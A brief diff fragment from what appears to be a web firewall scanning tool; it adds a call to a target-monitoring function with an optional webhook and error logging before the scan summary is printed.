+                monitor_target(WAFPierceDB(), args.target, webhook_url=args.webhook,
+                               session=scanner._session)
+            except Exception as e:
+                logger.debug(f"Monitor error: {e}")
+
         # Display results
         print(f"\n{'='*60}")
         print(f"[+] Scan Complete: Found {len(results)} findings")
